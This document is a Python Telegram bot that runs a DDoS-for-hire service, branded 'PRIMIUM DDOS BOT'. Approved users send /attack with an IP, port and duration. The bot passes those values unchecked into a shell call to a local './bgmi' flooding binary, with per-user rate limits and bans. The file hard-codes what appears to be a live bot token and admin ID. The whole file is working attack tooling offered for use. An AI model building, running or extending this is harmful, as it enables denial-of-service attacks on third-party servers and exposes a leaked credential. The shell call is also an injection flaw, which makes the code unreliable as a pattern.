import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from datetime import datetime, timedelta

TELEGRAM_BOT_TOKEN = '7749918794:AAFlgbWy2k9BTzJMPjFB1eJe7G4WUBniMrQ'  # Replace with your bot token
ADMIN_USER_ID = 1662672529  # Replace with your Telegram admin ID
APPROVED_IDS_FILE = 'approved_ids.txt'
attack_in_progress = False

# Track usage and bans
user_usage = {}  # Tracks how many times each user has used the /attack command
user_ban = {}  # Tracks users who are temporarily banned
user_last_attack = {}  # Tracks the last attack target for each user

# Load approved IDs (users and groups) from file
def load_approved_ids():
    try:
        with open(APPROVED_IDS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_approved_ids(approved_ids):
    with open(APPROVED_IDS_FILE, 'w') as f:
        f.writelines(f"{id_}\n" for id_ in approved_ids)

approved_ids = load_approved_ids()

# Start command
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐆𝐎𝐃x𝐂𝐇𝐄𝐀𝐓𝐒 𝐃𝐃𝐎𝐒  *\n"
        "*PRIMIUM DDOS BOT*\n"
        "*OWNER :- @GODxAloneBOY*\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Approve command to approve users and group chat IDs
async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="* Usage » /approve id (user or group chat ID)*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    approved_ids.add(target_id)
    save_approved_ids(approved_ids)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} approved.*", parse_mode='Markdown')

# Remove command to remove approved users and group chat IDs
async def remove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="* Usage » /remove id (user or group chat ID)*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    if target_id in approved_ids:
        approved_ids.discard(target_id)
        save_approved_ids(approved_ids)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} removed.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID {target_id} is not approved.*", parse_mode='Markdown')

# Check command to view all user IDs and usernames that used the bot
async def check(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    if not user_usage:
        await context.bot.send_message(chat_id=chat_id, text="*No users have used the bot yet.*", parse_mode='Markdown')
        return

    message = "*Users who used the bot:*\n"
    for user_id, count in user_usage.items():
        username = f"@{context.bot.get_chat(user_id).username}" if context.bot.get_chat(user_id).username else "No username"
        message += f"- {username} (ID: {user_id}, Usage: {count})\n"

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Attack command with restrictions
async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id in user_ban and user_ban[user_id] > datetime.now():
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You are temporarily banned from using the bot.*", parse_mode='Markdown')
        return

    if str(chat_id) not in approved_ids and user_id not in approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
        return

    if user_usage.get(user_id, 0) >= 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You have reached your limit of 3 attacks per hour.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*  example » /attack ip port time*", parse_mode='Markdown')
        return

    ip, port, time = args
    if user_last_attack.get(user_id) == (ip, port):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You cannot attack the same target consecutively.*", parse_mode='Markdown')
        return

    user_usage[user_id] = user_usage.get(user_id, 0) + 1
    user_last_attack[user_id] = (ip, port)

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃 ✅*\n"
        f"*⭐ Target » {ip}*\n"
        f"*⭐ Port » {port}*\n"
        f"*⭐ Time » {time} seconds*\n"
        f"*https://t.me/+03wLVBPurPk2NWRl*\n"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, time, context))

    # Ban user for 10 minutes if they spam
    if user_usage[user_id] >= 4:
        user_ban[user_id] = datetime.now() + timedelta(minutes=10)
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You are banned for 10 minutes due to spamming.*", parse_mode='Markdown')

# Attack execution function
async def run_attack(chat_id, ip, port, time, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {time} 500",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 ✅*\n*SEND FEEDBACK TO OWNER*\n*@GODxAloneBOY*", parse_mode='Markdown')

# Warn all users
async def warn(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    for user_id in user_usage:
        await context.bot.send_message(chat_id=user_id, text="*⚠️ Warning: Feedback to owner @GODxAloneBOY*", parse_mode='Markdown')

# Help command
async def help_command(update: Update, context: CallbackContext):
    message = (
        "*Available Commands:*\n"
        "/start - Start the bot\n"
        "/approve - Approve user/group\n"
        "/remove - Remove user/group\n"
        "/attack - Launch an attack (max 3/hour)\n"
        "/check - View bot usage\n"
        "/warn - Send a warning to all users\n"
        "/help - View this help message\n"
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

# Main function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("check", check))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("warn", warn))
    application.add_handler(CommandHandler("help", help_command))
    application.run_polling()

if __name__ == '__main__':
    main()
